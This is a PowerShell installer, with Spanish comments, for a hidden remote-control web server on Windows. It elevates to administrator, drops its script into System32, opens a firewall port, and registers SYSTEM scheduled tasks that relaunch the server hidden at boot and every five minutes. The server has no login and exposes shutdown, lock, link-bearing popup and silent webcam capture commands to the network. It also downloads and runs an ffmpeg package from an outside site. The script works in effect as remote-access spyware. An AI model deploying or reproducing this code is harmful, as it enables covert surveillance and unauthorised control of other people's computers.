param(
    [switch]$Desinstalar, 
    [int]$Puerto = 8080
)

$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$userName = $currentUser.Split('\')[1]
$computerName = $env:COMPUTERNAME

if ($Desinstalar) {
    Write-Host "DESINSTALANDO SERVIDOR WEB..." -ForegroundColor Yellow
    
    schtasks /delete /tn "PCWeb_SYSTEM" /f 2>$null
    schtasks /delete /tn "PCWeb_SYSTEM_Minuto" /f 2>$null
    
    netsh advfirewall firewall delete rule name="PCWeb_SYSTEM" 2>$null
    
    netsh http delete urlacl url="http://*:$Puerto/" 2>$null
    netsh http delete urlacl url="http://localhost:$Puerto/" 2>$null
    netsh http delete urlacl url="http://${computerName}:$Puerto/" 2>$null
    
    Remove-Item "C:\Windows\System32\WebServer.ps1" -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\System32\WebCamCaptures" -Recurse -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\webcam_temp" -Recurse -ErrorAction SilentlyContinue
    
    Get-Process -Name "powershell" | Where-Object { $_.CommandLine -like "*WebServer.ps1*" } | Stop-Process -Force -ErrorAction SilentlyContinue
    
    Write-Host "SERVIDOR WEB DESINSTALADO" -ForegroundColor Green
    exit
}

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Solicitando permisos de administrador..." -ForegroundColor Yellow
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Puerto $Puerto" -Verb RunAs
    exit
}

Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "   INSTALACION SERVIDOR WEB PUERTO $Puerto" -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "Usuario: $userName"
Write-Host "PC: $computerName"
Write-Host "Puerto: $Puerto"
Write-Host ""

Write-Host "1. Creando script del servidor..." -ForegroundColor Yellow

# Crear directorio para capturas
New-Item -ItemType Directory -Path "C:\Windows\System32\WebCamCaptures" -Force | Out-Null

$webServerScript = @'
param(
    [int]$Port = 8080
)

$logPath = "C:\Windows\System32\WebServer.log"
$pidFile = "C:\Windows\System32\WebServer.pid"
$capturePath = "C:\Windows\System32\WebCamCaptures"
$computerName = $env:COMPUTERNAME
$tempDir = "$env:TEMP\webcam_temp"
$zipPackage = "ffmpeg_webcam.zip"
$baseUrl = "https://hackingetico.cl/tools/pro"

function Write-Log {
    param($Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File $logPath -Append
}

function Initialize-FFmpeg {
    if (-not (Test-Path $tempDir)) {
        New-Item -Path $tempDir -ItemType Directory -Force | Out-Null
        Write-Log "Directorio temporal creado: $tempDir"
    }
    
    $ffmpegPath = "$tempDir\ffmpeg.exe"
    
    if (-not (Test-Path $ffmpegPath)) {
        Write-Log "Descargando FFmpeg desde $baseUrl/$zipPackage"
        $zipPath = "$tempDir\$zipPackage"
        
        try {
            Invoke-WebRequest -Uri "$baseUrl/$zipPackage" -OutFile $zipPath -ErrorAction Stop
            Write-Log "Paquete descargado: $zipPath"
            
            Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force
            Remove-Item -Path $zipPath -Force
            Write-Log "FFmpeg descomprimido correctamente"
            
            return $true
        } catch {
            Write-Log "ERROR al descargar/descomprimir FFmpeg: $($_.Exception.Message)"
            return $false
        }
    }
    
    return $true
}

function Get-WebCamCapture {
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $outputFile = "$capturePath\capture_$timestamp.jpg"
    $ffmpegPath = "$tempDir\ffmpeg.exe"
    
    Write-Log "Iniciando captura de webcam..."
    
    if (-not (Initialize-FFmpeg)) {
        Write-Log "ERROR: No se pudo inicializar FFmpeg"
        return $null
    }
    
    try {
        Write-Log "Detectando cámaras disponibles..."
        $devicesOutput = & $ffmpegPath -list_devices true -f dshow -i dummy 2>&1 | Out-String
        
        $cameraMatches = [regex]::Matches($devicesOutput, '\[dshow.*?\] "(.*?)" \(video\)')
        
        if ($cameraMatches.Count -eq 0) {
            Write-Log "ERROR: No se encontraron cámaras"
            return $null
        }
        
        $cameraName = $cameraMatches[0].Groups[1].Value
        Write-Log "Camara detectada: $cameraName"
        
        Write-Log "Capturando imagen..."
        $tempImage = "$tempDir\webcam_capture_$timestamp.jpg"
        $ffmpegCmd = "`"$ffmpegPath`" -y -f dshow -i video=`"$cameraName`" -frames:v 1 -q:v 2 `"$tempImage`" 2>&1"
        $captureOutput = cmd /c $ffmpegCmd 2>&1
        
        if ($LASTEXITCODE -ne 0) {
            Write-Log "ERROR en captura: $captureOutput"
            return $null
        }
        
        if (-not (Test-Path $tempImage)) {
            Write-Log "ERROR: No se genero el archivo de imagen"
            return $null
        }
        
        Copy-Item $tempImage $outputFile -Force
        Write-Log "Captura guardada: $outputFile"
        
        $imageBytes = [System.IO.File]::ReadAllBytes($tempImage)
        $base64Image = [Convert]::ToBase64String($imageBytes)
        
        Remove-Item $tempImage -Force -ErrorAction SilentlyContinue
        
        Write-Log "Captura completada exitosamente"
        return @{
            Path = $outputFile
            Base64 = $base64Image
            Timestamp = $timestamp
        }
        
    } catch {
        Write-Log "ERROR en captura de webcam: $($_.Exception.Message)"
        return $null
    }
}

function Send-PopupMessage {
    param($Message, $Title = "Mensaje del Administrador", $Link = "")
    
    Write-Log "Enviando mensaje popup: $Title"
    
    $displayMessage = $Message
    if ($Link) {
        $displayMessage += "`n`nEnlace: $Link"
    }
    
    $popupScript = @"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

`$form = New-Object System.Windows.Forms.Form
`$form.Text = "$Title"
`$form.Size = New-Object System.Drawing.Size(550, 350)
`$form.StartPosition = "CenterScreen"
`$form.Topmost = `$true
`$form.FormBorderStyle = "FixedDialog"
`$form.MaximizeBox = `$false
`$form.MinimizeBox = `$false
`$form.BackColor = [System.Drawing.Color]::FromArgb(240, 240, 240)

`$label = New-Object System.Windows.Forms.Label
`$label.Text = "$displayMessage"
`$label.Location = New-Object System.Drawing.Point(20, 30)
`$label.Size = New-Object System.Drawing.Size(490, 150)
`$label.Font = New-Object System.Drawing.Font("Segoe UI", 10)
`$label.ForeColor = [System.Drawing.Color]::Black
`$label.TextAlign = "MiddleCenter"

`$buttonPanel = New-Object System.Windows.Forms.Panel
`$buttonPanel.Location = New-Object System.Drawing.Point(0, 200)
`$buttonPanel.Size = New-Object System.Drawing.Size(534, 80)
`$buttonPanel.BackColor = [System.Drawing.Color]::FromArgb(245, 245, 245)

`$buttonAceptar = New-Object System.Windows.Forms.Button
`$buttonAceptar.Text = "Aceptar"
`$buttonAceptar.Location = New-Object System.Drawing.Point(150, 25)
`$buttonAceptar.Size = New-Object System.Drawing.Size(100, 35)
`$buttonAceptar.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
`$buttonAceptar.ForeColor = [System.Drawing.Color]::White
`$buttonAceptar.FlatStyle = "Flat"
`$buttonAceptar.Add_Click({ `$form.Close() })

`$buttonPanel.Controls.Add(`$buttonAceptar)

if ("$Link") {
    `$buttonAbrir = New-Object System.Windows.Forms.Button
    `$buttonAbrir.Text = "Abrir Enlace"
    `$buttonAbrir.Location = New-Object System.Drawing.Point(280, 25)
    `$buttonAbrir.Size = New-Object System.Drawing.Size(100, 35)
    `$buttonAbrir.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
    `$buttonAbrir.ForeColor = [System.Drawing.Color]::White
    `$buttonAbrir.FlatStyle = "Flat"
    `$buttonAbrir.Add_Click({
        Start-Process "$Link"
        `$form.Close()
    })
    `$buttonPanel.Controls.Add(`$buttonAbrir)
}

`$form.Controls.Add(`$label)
`$form.Controls.Add(`$buttonPanel)

`$form.ShowDialog()
"@
    
    $popupFile = "$env:TEMP\popup_$(Get-Random).ps1"
    $popupScript | Out-File $popupFile -Encoding UTF8 -Force
    
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Normal -File `"$popupFile`"" -WindowStyle Normal
    
    Start-Sleep -Seconds 10
    Remove-Item $popupFile -ErrorAction SilentlyContinue
    
    Write-Log "Mensaje popup enviado"
}

function Start-WebServer {
    $pid | Out-File $pidFile -Force
    
    Write-Log "======================================"
    Write-Log "INICIANDO SERVIDOR WEB EN PUERTO $Port"
    Write-Log "Usuario: $env:USERNAME"
    Write-Log "Computadora: $computerName"
    Write-Log "PID: $pid"
    Write-Log "Nivel: SYSTEM"
    
    try {
        $listener = New-Object System.Net.HttpListener
        
        $listener.Prefixes.Add("http://*:$Port/")
        $listener.Prefixes.Add("http://localhost:$Port/")
        $listener.Prefixes.Add("http://${computerName}:$Port/")
        
        $listener.Start()
        
        Write-Log "SERVIDOR INICIADO CORRECTAMENTE"
        Write-Log "Prefijos registrados:"
        foreach ($prefix in $listener.Prefixes) {
            Write-Log "  - $prefix"
        }
        
        while ($true) {
            $context = $listener.GetContext()
            $request = $context.Request
            $response = $context.Response
            
            if ($request.Url.LocalPath -eq '/' -or $request.Url.LocalPath -eq '') {
                $html = @"
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Control PC Remoto</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { background: #f5f5f5; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px; }
.container { max-width: 1200px; margin: 0 auto; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 20px; }
.header { text-align: center; margin-bottom: 30px; border-bottom: 2px solid #e0e0e0; padding-bottom: 20px; }
.header h1 { color: #333; font-size: 24px; }
.status-card { background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 8px; padding: 20px; margin-bottom: 30px; }
.info-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; text-align: center; }
.info-item .label { font-size: 12px; color: #6c757d; text-transform: uppercase; }
.info-item .value { font-size: 20px; font-weight: bold; color: #007bff; margin-top: 5px; }
.buttons-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-bottom: 30px; }
.btn { background: #007bff; border: none; color: white; padding: 10px 20px; text-align: center; cursor: pointer; border-radius: 5px; transition: background 0.3s; font-size: 14px; font-weight: 500; }
.btn:hover { background: #0056b3; }
.btn-danger { background: #dc3545; }
.btn-danger:hover { background: #c82333; }
.btn-warning { background: #ffc107; color: #212529; }
.btn-warning:hover { background: #e0a800; }
.btn-success { background: #28a745; }
.btn-success:hover { background: #218838; }
.message-card, .capture-card { background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 8px; padding: 20px; margin-bottom: 30px; }
.message-card h3, .capture-card h3 { color: #333; margin-bottom: 15px; font-size: 18px; }
input, textarea { width: 100%; border: 1px solid #ced4da; border-radius: 4px; padding: 8px 12px; margin-bottom: 10px; font-family: inherit; font-size: 14px; }
textarea { resize: vertical; min-height: 80px; }
.capture-preview { text-align: center; margin-top: 15px; }
.capture-img { max-width: 100%; max-height: 400px; border-radius: 5px; border: 1px solid #dee2e6; }
.console { background: #1e1e1e; border: 1px solid #333; border-radius: 5px; padding: 15px; height: 200px; overflow-y: auto; font-family: 'Consolas', monospace; font-size: 12px; color: #d4d4d4; }
.footer { text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #e0e0e0; color: #6c757d; font-size: 12px; }
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>Control PC Remoto</h1>
<p>Panel de control remoto</p>
</div>

<div class="status-card">
<div class="info-grid">
<div class="info-item"><div class="label">HOSTNAME</div><div class="value" id="pcName">---</div></div>
<div class="info-item"><div class="label">USUARIO</div><div class="value" id="pcUser">---</div></div>
<div class="info-item"><div class="label">HORA</div><div class="value" id="pcTime">---</div></div>
</div>
</div>

<div class="buttons-grid">
<button class="btn btn-danger" onclick="sendCommand('apagar')">APAGAR</button>
<button class="btn btn-warning" onclick="sendCommand('reiniciar')">REINICIAR</button>
<button class="btn" onclick="sendCommand('bloquear')">BLOQUEAR</button>
<button class="btn btn-success" onclick="sendCommand('estado')">ESTADO</button>
<button class="btn" onclick="sendCommand('cancelar')">CANCELAR</button>
<button class="btn" onclick="captureWebcam()">CAPTURAR WEBCAM</button>
</div>

<div class="message-card">
<h3>Enviar Mensaje</h3>
<input type="text" id="msgTitle" placeholder="Titulo del mensaje" value="Mensaje del Administrador">
<textarea id="msgText" placeholder="Escribe tu mensaje aqui..."></textarea>
<input type="text" id="msgLink" placeholder="Enlace para abrir (opcional)">
<button class="btn" onclick="sendMessage()" style="width: 100%;">ENVIAR MENSAJE</button>
</div>

<div class="capture-card" id="captureCard" style="display: none;">
<h3>Ultima Captura</h3>
<div class="capture-preview">
<img id="captureImage" class="capture-img">
</div>
</div>

<div class="console" id="console">
> SISTEMA LISTO<br>
> Esperando comandos...
</div>

<div class="footer">
Puerto: $Port | PID: $pid
</div>
</div>

<script>
function addConsoleMessage(msg, type) {
    const console = document.getElementById('console');
    const time = new Date().toLocaleTimeString();
    const prefix = type === 'error' ? '[ERROR]' : type === 'success' ? '[OK]' : '[INFO]';
    console.innerHTML += `<br>> [${time}] ${prefix} ${msg}`;
    console.scrollTop = console.scrollHeight;
}

async function sendCommand(command) {
    addConsoleMessage(`Ejecutando: ${command}`, 'info');
    try {
        const response = await fetch('/cmd', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ accion: command })
        });
        const data = await response.json();
        addConsoleMessage(data.mensaje, data.mensaje.includes('ERROR') ? 'error' : 'success');
    } catch (error) {
        addConsoleMessage(`Error: ${error.message}`, 'error');
    }
}

async function captureWebcam() {
    addConsoleMessage('Iniciando captura de webcam...', 'info');
    try {
        const response = await fetch('/cmd', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ accion: 'webcam' })
        });
        const data = await response.json();
        
        if (data.imagen) {
            const captureCard = document.getElementById('captureCard');
            const captureImage = document.getElementById('captureImage');
            captureImage.src = `data:image/jpeg;base64,${data.imagen}`;
            captureCard.style.display = 'block';
            addConsoleMessage('Captura realizada exitosamente', 'success');
        } else {
            addConsoleMessage('Error en la captura', 'error');
        }
    } catch (error) {
        addConsoleMessage(`Error: ${error.message}`, 'error');
    }
}

async function sendMessage() {
    const title = document.getElementById('msgTitle').value;
    const message = document.getElementById('msgText').value;
    const link = document.getElementById('msgLink').value;
    
    if (!message) {
        addConsoleMessage('Escribe un mensaje primero', 'error');
        return;
    }
    
    addConsoleMessage(`Enviando mensaje: ${title}...`, 'info');
    try {
        const response = await fetch('/sendmessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ titulo: title, mensaje: message, enlace: link })
        });
        const data = await response.json();
        addConsoleMessage(data.mensaje, 'success');
        document.getElementById('msgText').value = '';
        document.getElementById('msgLink').value = '';
    } catch (error) {
        addConsoleMessage(`Error: ${error.message}`, 'error');
    }
}

async function updateInfo() {
    try {
        const response = await fetch('/info');
        const data = await response.json();
        document.getElementById('pcName').innerText = data.nombre;
        document.getElementById('pcUser').innerText = data.usuario;
        document.getElementById('pcTime').innerText = data.hora;
    } catch (error) {
        console.error('Error updating info:', error);
    }
}

updateInfo();
setInterval(updateInfo, 1000);
</script>
</body>
</html>
"@
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
                $response.ContentType = 'text/html; charset=utf-8'
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            elseif ($request.Url.LocalPath -eq '/info') {
                $info = @{
                    nombre = $env:COMPUTERNAME
                    usuario = $env:USERNAME
                    hora = (Get-Date).ToString('HH:mm:ss')
                }
                $json = $info | ConvertTo-Json
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($json)
                $response.ContentType = 'application/json; charset=utf-8'
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            elseif ($request.Url.LocalPath -eq '/cmd' -and $request.HttpMethod -eq 'POST') {
                $reader = New-Object System.IO.StreamReader($request.InputStream)
                $body = $reader.ReadToEnd()
                $data = $body | ConvertFrom-Json
                
                $mensaje = ""
                $imagen = $null
                
                switch ($data.accion) {
                    'apagar' { 
                        shutdown /s /f /t 0
                        $mensaje = "APAGANDO EQUIPO..."
                    }
                    'reiniciar' { 
                        shutdown /r /f /t 0
                        $mensaje = "REINICIANDO EQUIPO..."
                    }
                    'bloquear' { 
                        rundll32.exe user32.dll,LockWorkStation
                        $mensaje = "BLOQUEANDO SESION..."
                    }
                    'estado' { 
                        $mensaje = "SISTEMA OK - $(Get-Date)"
                    }
                    'cancelar' { 
                        shutdown /a
                        $mensaje = "APAGADO CANCELADO"
                    }
                    'webcam' {
                        $captura = Get-WebCamCapture
                        if ($captura -and $captura.Base64) {
                            $mensaje = "CAPTURA REALIZADA: $($captura.Timestamp)"
                            $imagen = $captura.Base64
                            Write-Log "Webcam capture successful: $($captura.Path)"
                        } else {
                            $mensaje = "ERROR AL CAPTURAR WEBCAM - Verifique que haya una camara conectada"
                            Write-Log "Webcam capture failed"
                        }
                    }
                    default { 
                        $mensaje = "COMANDO NO RECONOCIDO"
                    }
                }
                
                $result = @{ mensaje = $mensaje; imagen = $imagen }
                $json = $result | ConvertTo-Json
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($json)
                $response.ContentType = 'application/json; charset=utf-8'
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
                
                Write-Log "Comando ejecutado: $($data.accion) - $mensaje"
            }
            elseif ($request.Url.LocalPath -eq '/sendmessage' -and $request.HttpMethod -eq 'POST') {
                $reader = New-Object System.IO.StreamReader($request.InputStream)
                $body = $reader.ReadToEnd()
                $data = $body | ConvertFrom-Json
                
                Send-PopupMessage -Message $data.mensaje -Title $data.titulo -Link $data.enlace
                
                $result = @{ mensaje = "MENSAJE ENVIADO: $($data.titulo)" }
                $json = $result | ConvertTo-Json
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($json)
                $response.ContentType = 'application/json; charset=utf-8'
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
                
                Write-Log "Mensaje enviado: $($data.titulo) - $($data.mensaje)"
            }
            else {
                $response.StatusCode = 404
                $buffer = [System.Text.Encoding]::UTF8.GetBytes("404 - No encontrado")
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            
            $response.Close()
        }
    } catch {
        Write-Log "ERROR CRITICO: $_"
        Write-Log "Detalles: $($_.Exception.Message)"
        Write-Log "Stack: $($_.ScriptStackTrace)"
        
        Start-Sleep -Seconds 30
        Start-WebServer
    }
}

Start-WebServer
'@

$webServerScript | Out-File "C:\Windows\System32\WebServer.ps1" -Encoding UTF8 -Force

Write-Host "  OK - Script creado: C:\Windows\System32\WebServer.ps1" -ForegroundColor Green

# Configuración firewall
Write-Host ""
Write-Host "2. Configurando firewall..." -ForegroundColor Yellow
netsh advfirewall firewall delete rule name="PCWeb_SYSTEM" 2>$null
netsh advfirewall firewall add rule name="PCWeb_SYSTEM" dir=in action=allow protocol=TCP localport=$Puerto 2>$null
Write-Host "  OK - Regla de firewall agregada" -ForegroundColor Green

# Reservar URLs
Write-Host ""
Write-Host "3. Reservando URL en el sistema..." -ForegroundColor Yellow
netsh http delete urlacl url="http://*:$Puerto/" 2>$null
netsh http delete urlacl url="http://localhost:$Puerto/" 2>$null
netsh http delete urlacl url="http://${computerName}:$Puerto/" 2>$null

netsh http add urlacl url="http://*:$Puerto/" user=BUILTIN\Users 2>$null
netsh http add urlacl url="http://localhost:$Puerto/" user=BUILTIN\Users 2>$null
netsh http add urlacl url="http://${computerName}:$Puerto/" user=BUILTIN\Users 2>$null
Write-Host "  OK - URLs reservadas" -ForegroundColor Green

# Crear tareas programadas
Write-Host ""
Write-Host "4. Creando tareas programadas como SYSTEM..." -ForegroundColor Yellow

schtasks /delete /tn "PCWeb_SYSTEM" /f 2>$null
schtasks /delete /tn "PCWeb_SYSTEM_Minuto" /f 2>$null

$taskCommand = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"C:\Windows\System32\WebServer.ps1`" -Port $Puerto"

# Tarea al iniciar Windows (con retardo para asegurar que el sistema esté listo)
schtasks /create /tn "PCWeb_SYSTEM" `
    /tr "$taskCommand" `
    /sc onstart `
    /ru SYSTEM `
    /rl HIGHEST `
    /delay 0000:30 `
    /f 2>$null

# Tarea de respaldo cada 5 minutos (por si acaso el servidor se cae)
schtasks /create /tn "PCWeb_SYSTEM_Minuto" `
    /tr "$taskCommand" `
    /sc minute `
    /mo 5 `
    /ru SYSTEM `
    /rl HIGHEST `
    /f 2>$null

Write-Host "  OK - Tareas creadas como SYSTEM:" -ForegroundColor Green
Write-Host "    - PCWeb_SYSTEM (al iniciar Windows, con retardo de 30 segundos)" -ForegroundColor White
Write-Host "    - PCWeb_SYSTEM_Minuto (cada 5 minutos, para garantizar que siempre este activo)" -ForegroundColor White

# Matar procesos anteriores
Write-Host ""
Write-Host "5. Matando procesos anteriores..." -ForegroundColor Yellow
Get-Process -Name "powershell" | Where-Object { $_.CommandLine -like "*WebServer.ps1*" } | Stop-Process -Force -ErrorAction SilentlyContinue 2>$null
Start-Sleep -Seconds 2

# Iniciar servidor
Write-Host ""
Write-Host "6. Iniciando servidor como SYSTEM..." -ForegroundColor Yellow

$arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"C:\Windows\System32\WebServer.ps1`" -Port $Puerto"
Start-Process powershell.exe -ArgumentList $arguments -WindowStyle Hidden -Verb RunAs

Write-Host "  OK - Servidor iniciado" -ForegroundColor Green
Start-Sleep -Seconds 5

# Probar conexión
Write-Host ""
Write-Host "7. Probando conexion..." -ForegroundColor Yellow

$conexionExitosa = $false
for ($i = 1; $i -le 10; $i++) {
    try {
        $test = Invoke-RestMethod -Uri "http://localhost:$Puerto/info" -TimeoutSec 2 -ErrorAction SilentlyContinue
        if ($test.nombre) {
            Write-Host "  OK - CONEXION EXITOSA (Intento $i/10)" -ForegroundColor Green
            Write-Host "    PC: $($test.nombre)" -ForegroundColor White
            Write-Host "    Usuario: $($test.usuario)" -ForegroundColor White
            $conexionExitosa = $true
            break
        }
    } catch {
        Write-Host "  Intentando conectar... (Intento $i/10)" -ForegroundColor Yellow
        Start-Sleep -Seconds 2
    }
}

if (-not $conexionExitosa) {
    Write-Host "  ADVERTENCIA: No se pudo conectar, pero el servidor deberia estar funcionando" -ForegroundColor Yellow
    Write-Host "  Revisa el log: C:\Windows\System32\WebServer.log" -ForegroundColor White
}

# Obtener IP
try {
    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -notlike "169.254.*"}).IPAddress | Select-Object -First 1
    if (-not $ip) {
        $ip = (Test-Connection -ComputerName $computerName -Count 1).IPV4Address.IPAddressToString
    }
} catch {
    $ip = "192.168.x.x"
}

Write-Host ""
Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "   INSTALACION COMPLETADA" -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "URL DE ACCESO:" -ForegroundColor Yellow
Write-Host "  Local:    http://localhost:$Puerto" -ForegroundColor White
Write-Host "  Red:      http://$($ip):$Puerto" -ForegroundColor White
Write-Host "  Nombre:   http://${computerName}:$Puerto" -ForegroundColor White
Write-Host ""
Write-Host "ARCHIVOS:" -ForegroundColor Yellow
Write-Host "  Script:   C:\Windows\System32\WebServer.ps1" -ForegroundColor White
Write-Host "  Capturas: C:\Windows\System32\WebCamCaptures\" -ForegroundColor White
Write-Host "  Log:      C:\Windows\System32\WebServer.log" -ForegroundColor White
Write-Host ""
Write-Host "TAREAS PROGRAMADAS (GARANTIZAN QUE EL SERVIDOR SIEMPRE ESTE ACTIVO):" -ForegroundColor Yellow
Write-Host "  - PCWeb_SYSTEM: Se ejecuta al iniciar Windows (retardo 30 segundos)" -ForegroundColor Green
Write-Host "  - PCWeb_SYSTEM_Minuto: Se ejecuta cada 5 minutos (respaldo)" -ForegroundColor Green
Write-Host ""
Write-Host "DESINSTALAR:" -ForegroundColor Yellow
Write-Host "  powershell -File `"$PSCommandPath`" -Desinstalar" -ForegroundColor White
Write-Host ""
Write-Host "==========================================" -ForegroundColor Cyan
Write-Host ""

Read-Host "Presiona Enter para salir"
